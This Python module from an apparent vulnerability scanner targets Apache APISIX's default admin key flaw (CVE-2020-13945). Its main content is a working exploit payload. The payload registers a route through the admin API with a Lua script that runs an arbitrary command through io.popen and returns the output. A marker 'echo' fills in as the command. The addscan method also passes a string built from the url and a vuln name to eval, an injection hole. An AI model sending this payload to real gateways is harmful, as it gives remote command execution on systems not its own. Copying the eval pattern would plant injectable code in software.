#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Apache APISIX是一个高性能API网关
    ApacheAPISIX扫描类: 
        Apache APISIX默认密钥漏洞
            CVE-2020-13945
'''

from lib.initial.config import config
from lib.tool.md5 import md5
from lib.tool.thread import thread
from payloads.ApacheAPISIX.cve_2020_13945 import cve_2020_13945_scan

class APISIX():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheAPISIX'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.success = False
        self.cve_2020_13945_payloads = [
            {
                'path': 'apisix/admin/routes',
                'data': '''{
    "uri": "/mouse",
"script": "local _M = {} \\n function _M.access(conf, ctx) \\n local f = assert(io.popen('RCECOMMAND', 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}'''
            }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2020_13945_scan, url=url)
        ]

APISIX.cve_2020_13945_scan = cve_2020_13945_scan

apisix = APISIX()